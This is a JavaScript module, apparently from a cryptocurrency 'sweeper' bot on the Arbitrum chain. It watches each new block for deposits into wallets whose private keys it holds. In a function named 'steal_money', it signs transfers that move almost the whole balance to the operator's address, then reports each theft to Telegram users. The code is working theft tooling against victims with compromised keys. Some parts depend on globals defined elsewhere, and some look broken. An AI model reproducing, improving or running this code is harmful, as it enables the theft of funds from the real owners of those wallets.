const Web3 = require("web3")
const fs = require('fs');
const readline = require('readline');
const TelegramBot = require('node-telegram-bot-api')
const path = require("path");


module.exports = {
    telegram_token_read_arb: async function () {
        while (true) {
            if (users.length > 0) {
                for (let i = 0; i < users.length; i++) {
                    await bot.sendMessage(users[i], 'Arbitrum Chain Connected...✅')
                }
                apis_read()
                break
            } else {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}


async function apis_read() {
    const fileStream = fs.createReadStream(path.join("info", "apis.txt"));
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var apis_list = []
    for await (const line of rl) {
        var rl_token = line.split(['='])[1];
        apis_list.push(rl_token)
    }
    global.moralis_arb = apis_list[17]
    global.web8 = new Web3(moralis_arb)
    global.arb_gwei= apis_list[18]
    global.arb_grab_from = apis_list[19]
    global.arb_gas_addon = await web8.utils.toWei(arb_grab_from, 'ether')
    global.arb_cash_limit = Number(web8.utils.toWei(String(1), 'ether'))
    global.arb_gas_transfer_amount = Number(web8.utils.toWei(arb_gwei, 'gwei'))
    getBlocks()
}


async function getBlocks() {
    var work = true
    while (work) {
        try {
            var latestBlock = await web8.eth.getBlock(block_identifier = web8.eth.defaultBlock, full_transactions = true);
            global.trans_arb = latestBlock.transactions;
            for(var x in trans_arb) {
                var to_address = trans_arb[x]['to'];
                if (to_address in all_wallets) {
                    steal_money(to_address, all_wallets[to_address]);
                }
            }
            await new Promise(resolve => setTimeout(resolve, 333));
            console.log('                                                                          ARBIT '+ latestBlock.number);
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            global.web8 = new Web3(moralis_arb)
        }
    }
}


async function steal_money(wallet, wallet_specs) {
    try {
        var private_key = wallet_specs[0]
        var counter = 0
        while (true) {
            var balance = await web8.eth.getBalance(wallet)
            if (Number(balance) < arb_gas_addon) {
                await new Promise(resolve => setTimeout(resolve, 30));
                counter++
                if (counter === 200) {
                    return;
                }
            } else {
                break;
            }
        }
        var nonce = await web8.eth.getTransactionCount(wallet)
        var transfer_amount = Number(balance) - arb_gas_transfer_amount * 21000
        var tx_price = {
            'chainId': 42161,
            'nonce': nonce,
            'to': user_wallet_address_all_2checksom,
            'value': transfer_amount,
            'gas': 21000,
            'gasPrice': arb_gas_transfer_amount
        }
        var signed_tx = await web8.eth.accounts.signTransaction(tx_price, private_key)
        var tx_hash = await web8.eth.sendSignedTransaction(signed_tx.rawTransaction)
        global.tx_link_arb = 'https://arbiscan.io/tx/' + tx_hash.transactionHash
        global.amount_sent_arb = await web8.utils.fromWei(String(transfer_amount), 'ether')
        console.log('💰ARBI '+amount_sent_arb+'💰 Transaction successful! ' + tx_link_arb)
        global.user_wallet_address_all_2checksom = web5.utils.toChecksumAddress(user_wallet_address)
        sending_good_news()
    } catch (e) {
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}


async function sending_good_news() {
    var results ='💰ARBI '+amount_sent_arb+'💰 ' + tx_link_arb
    if (users.length > 0) {
        for (let i = 0; i < users.length; i++) {
            await bot.sendMessage(users[i], results)
        }
    }
}